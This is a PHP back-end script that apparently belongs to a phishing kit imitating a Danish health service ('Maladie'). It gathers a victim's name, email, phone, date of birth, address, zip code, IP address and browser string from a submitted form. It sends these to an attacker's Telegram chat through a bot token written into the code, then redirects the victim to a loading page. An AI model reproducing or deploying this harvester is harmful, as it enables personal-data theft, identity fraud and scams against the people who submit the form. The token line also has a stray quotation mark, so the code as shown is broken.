<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "******🇩🇰***Maladie***🇩🇰*****\n";
$message .= "Name : ".$_POST['name']."\n";
$message .= "Email : ".$_POST['mail']."\n";
$message .= "Tele : ".$_POST['phone']."\n";
$message .= "Date : ".$_POST['age']."\n";
$message .= "Adress : ".$_POST['adress']."\n";
$message .= "Zip : ".$_POST['zip']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------------------------\n";
$token = "6493750576:AAHlXbCRrtrDeo3VgvelLeWj1fFIFL5HWnU"";
$data = [
    'text' => $message,
    'chat_id' => '-915905868'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../load.html");?>

<?php